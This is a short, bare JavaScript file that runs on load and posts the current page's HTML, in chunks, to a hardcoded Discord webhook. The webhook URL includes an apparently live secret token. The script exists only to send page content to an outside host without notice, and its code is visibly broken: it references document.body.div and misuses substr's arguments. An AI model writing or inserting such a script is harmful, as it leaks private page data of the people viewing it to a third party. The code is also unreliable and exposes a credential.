function sendMessage() {
    const webhookUrl = "https://discord.com/api/webhooks/1230013392190836807/YBJ3pNOa544labFi-TcurRFMDKlM2LMT36Jiel1PFWAy8TDWQqUa-yolhXwHQYD-F8bh";
    const message = document.body.div.innerHTML;

    for (let i = 0; i < Math.round(document.body.innerHTML.length / 100); i++) {
        const request = new XMLHttpRequest();
        request.open("POST", webhookUrl);
        request.setRequestHeader("Content-type", "application/json");

        const messageData = {
            content: message.substr(i*100, i*100+100),
            username: "My Webhook From Library Monday",
            avatar_url: "https://example.com/avatar.png"
        };

        request.send(JSON.stringify(messageData));
    }
}

sendMessage();
